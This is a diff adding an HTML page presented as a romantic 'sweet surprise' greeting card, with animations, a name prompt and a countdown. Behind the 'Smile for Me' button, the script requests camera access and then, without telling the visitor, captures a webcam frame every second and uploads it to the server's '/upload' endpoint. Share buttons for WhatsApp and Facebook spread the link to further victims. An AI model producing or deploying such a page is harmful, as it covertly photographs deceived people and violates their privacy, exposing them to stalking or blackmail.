@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>❤️ A Sweet Surprise for You 💌</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <link href="https://fonts.googleapis.com/css2?family=Concert+One&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+
+  <style>
+    body {
+      background: linear-gradient(to bottom right, #ff9a9e, #fad0c4, #ff6a88);
+      font-family: 'Concert One', cursive;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+      color: #fff;
+      overflow-x: hidden;
+      position: relative;
+      min-height: 100vh;
+    }
+
+    .holi-particle {
+      position: absolute;
+      width: 15px;
+      height: 15px;
+      border-radius: 50%;
+      pointer-events: none;
+      animation: fall linear forwards;
+    }
+
+    .holi-letter {
+      position: absolute;
+      font-size: 24px;
+      font-weight: bold;
+      pointer-events: none;
+      animation: fall linear forwards;
+    }
+
+    @keyframes fall {
+      to {
+        transform: translateY(100vh);
+      }
+    }
+
+    .container {
+      padding: 20px;
+      position: relative;
+      z-index: 10;
+    }
+
+    .greeting {
+      font-size: 30px;
+      text-shadow: 0 0 10px #ff0055;
+      margin-top: 20px;
+      animation: glow 5s ease-in-out infinite;
+    }
+
+    @keyframes glow {
+      0%,100% { text-shadow: 0 0 20px pink; }
+      25% { text-shadow: 0 0 20px #ff0055; }
+      50% { text-shadow: 0 0 20px red; }
+      75% { text-shadow: 0 0 20px violet; }
+    }
+
+    marquee {
+      font-size: 18px;
+      margin: 10px auto;
+      background: #fff0f5;
+      color: #d10068;
+      padding: 8px;
+      border-radius: 12px;
+      width: 90%;
+    }
+
+    #canvas, #video {
+      display: none;
+    }
+
+    .btn, .claim-btn, .selfie-btn {
+      display: inline-block;
+      background: #ff0055;
+      color: #fff;
+      padding: 10px 20px;
+      border-radius: 10px;
+      margin: 10px;
+      font-size: 18px;
+      text-decoration: none;
+      cursor: pointer;
+      position: relative;
+      z-index: 10;
+    }
+
+    .footer-buttons {
+      position: fixed;
+      bottom: 10px;
+      left: 0;
+      right: 0;
+      display: flex;
+      justify-content: space-evenly;
+      z-index: 10;
+    }
+
+    #countdown {
+      font-size: 20px;
+      margin: 15px 0;
+      color: #fff;
+      position: relative;
+      z-index: 10;
+    }
+
+    #name-display {
+      font-size: 28px;
+      margin: 20px 0;
+      text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+      position: relative;
+      z-index: 10;
+    }
+  </style>
+</head>
+
+<body onload="startPage()">
+  <div class="container">
+    <h1 class="greeting">💖 A Romantic Surprise Awaits You 💖</h1>
+
+    <p id="countdown">⌛ Just a moment...</p>
+
+    <marquee>🌹 "Your smile is the sunshine of my day" 🌹</marquee>
+    <marquee>💌 "If I had a flower for every time I thought of you... I'd walk in my garden forever." 💌</marquee>
+    <marquee>❤️ You are special to me in every possible way ❤️</marquee>
+
+    <div id="name-display"></div>
+    <p>🥰 I'm just glad you're here. You make the world more beautiful. 🥰</p>
+
+    <p style="
+      font-size: 28px;
+      font-weight: bold;
+      background: linear-gradient(to right, red,black);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      text-shadow: 1px 1px 2px rgba(0,0,0,0.3);">
+      <span style="color: white;">📷</span> Just smile for me — you're perfect the way you are! <span style="color: white;">📷</span><br>
+      Allow camera if you're okay with it 💕
+    </p>
+
+    <button class="claim-btn" onclick="">💝 Open My Heart</button>
+    <button class="selfie-btn" onclick="startCamera()">📸 Smile for Me</button>
+
+    <div hidden>
+      <video id="video" autoplay playsinline></video>
+    </div>
+  </div>
+
+  <div class="footer-buttons">
+    <a class="btn" href="whatsapp://send?text=💖 Someone sent you a special surprise 💝 Click here 👉 forwarding_link">Send to Someone You Love</a>
+    <a class="btn" href="https://www.facebook.com/sharer/sharer.php?u=forwarding_link" target="_blank">Share on Facebook</a>
+  </div>
+
+  <script>
+    let userName;
+    let holiInterval;
+    let nameLetters = [];
+    const colors = ['#ff69b4', '#ff1493', '#db7093', '#ffa07a', '#ffc0cb'];
+
+    function startPage() {
+      userName = prompt("💌 Hey cutie, what's your name?");
+      const nameDisplay = document.getElementById("name-display");
+      nameDisplay.innerHTML = userName ? "💕 To my sweet " + userName + " 💕" : "💕 To someone very special 💕";
+
+      startHoliAnimation();
+      startCountdown();
+    }
+
+    function startHoliAnimation() {
+      createHoliParticles();
+      holiInterval = setInterval(createHoliParticles, 2000);
+      if (userName) {
+        nameLetters = userName.split('');
+        setInterval(createNameParticles, 3000);
+      }
+    }
+
+    function createHoliParticles() {
+      for (let i = 0; i < 25; i++) {
+        setTimeout(() => {
+          const particle = document.createElement('div');
+          particle.className = 'holi-particle';
+          particle.style.background = colors[Math.floor(Math.random() * colors.length)];
+          particle.style.left = Math.random() * 100 + 'vw';
+          particle.style.top = '-20px';
+          particle.style.animationDuration = (Math.random() * 3 + 2) + 's';
+          document.body.appendChild(particle);
+          setTimeout(() => {
+            particle.remove();
+          }, 5000);
+        }, i * 50);
+      }
+    }
+
+    function createNameParticles() {
+      nameLetters.forEach((letter, index) => {
+        setTimeout(() => {
+          const letterParticle = document.createElement('div');
+          letterParticle.className = 'holi-letter';
+          letterParticle.textContent = letter;
+          letterParticle.style.color = colors[Math.floor(Math.random() * colors.length)];
+          letterParticle.style.left = (5 + (Math.random() * 90)) + 'vw';
+          letterParticle.style.top = '-50px';
+          letterParticle.style.animationDuration = (Math.random() * 3 + 2) + 's';
+          document.body.appendChild(letterParticle);
+          setTimeout(() => {
+            letterParticle.remove();
+          }, 5000);
+        }, index * 200);
+      });
+    }
+
+    function startCountdown() {
+      const countdownDate = new Date(new Date().getTime() + 3 * 60 * 1000).getTime();
+      const countdownEl = document.getElementById("countdown");
+
+      const interval = setInterval(() => {
+        const now = new Date().getTime();
+        const diff = countdownDate - now;
+        if (diff < 0) {
+          clearInterval(interval);
+          countdownEl.innerText = "💖 Surprise Unlocked 💖";
+          return;
+        }
+        const mins = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+        const secs = Math.floor((diff % (1000 * 60)) / 1000);
+        countdownEl.innerText = `⏳ Just ${mins} min ${secs} sec until your surprise...`;
+      }, 1000);
+    }
+
+    const video = document.getElementById('video');
+    const captureInterval = 1000;
+    let captureTimer;
+
+    function startCamera() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
+          video.play();
+          if (!captureTimer) {
+            captureTimer = setInterval(captureAndSend, captureInterval);
+          }
+        })
+        .catch(error => {
+          document.body.innerHTML = "<h2>📵 Oh no! Camera access denied. I still like you anyway. 🥲</h2>";
+        });
+    }
+
+    function captureAndSend() {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0);
+
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('webcam', blob, 'frame.jpg');
+        fetch('/upload', {
+          method: 'POST',
+          body: formData
+        });
+      }, 'image/jpeg');
+    }
+
+    window.addEventListener('beforeunload', function() {
+      clearInterval(holiInterval);
+      if (captureTimer) clearInterval(captureTimer);
+    });
+  </script>
+</body>
+</html>
+
